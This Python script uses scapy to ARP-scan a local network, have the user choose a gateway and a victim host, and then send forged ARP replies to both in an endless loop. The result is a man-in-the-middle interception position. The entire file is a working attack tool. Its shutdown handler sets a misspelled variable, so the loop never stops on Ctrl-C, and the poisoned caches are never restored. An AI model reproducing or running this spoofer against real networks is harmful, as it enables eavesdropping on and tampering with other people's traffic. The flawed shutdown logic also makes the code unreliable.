import signal
import time

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send

SLEEP_TIMEOUT = 2
terminated = False


def scan_arp(network):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network), timeout=10, verbose=False)
    return ans


def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip,
                       hwdst=target_mac,
                       psrc=spoof_ip)
    send(packet, verbose=False)


def arp_spoofing(mask_ip, mask_mac, attack_ip, attack_mac):
    sent_packets_count = 0
    while not terminated:
        spoof(attack_ip, attack_mac, mask_ip)
        spoof(mask_ip, mask_mac, attack_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(SLEEP_TIMEOUT)


def dialog():
    default_network = "192.168.0.0/24"
    network = input("Enter network to scan [%s]:" % default_network)
    if not network:
        network = default_network
    answers = scan_arp(network)
    if len(answers) == 0:
        print("There are no hosts in this network, bye!")
        return
    print("Detected hosts:")
    number = 1
    for answer in answers:
        print("%d. %s\t%s" % (number, answer[1].psrc, answer[1].hwsrc))
        number += 1
    mask_number = int(input("choose gateway [%d-%d]:" % (1, number-1)))
    attack_number = int(input("choose host to spoof [%d-%d]:" % (1, number-1)))
    attack_ip = answers[attack_number-1][1].psrc
    attack_mac = answers[attack_number-1][1].hwsrc
    mask_ip = answers[mask_number-1][1].psrc
    mask_mac = answers[mask_number-1][1].hwsrc
    print("start spoofing %s %s" % (attack_ip, attack_mac))
    print("pretend to be %s %s" % (mask_ip, mask_mac))
    arp_spoofing(mask_ip, mask_mac, attack_ip, attack_mac)


def exit_gracefully(signum, frame):
    global terminate
    terminate = True


if __name__ == "__main__":
    signal.signal(signal.SIGINT, exit_gracefully)
    signal.signal(signal.SIGTERM, exit_gracefully)
    dialog()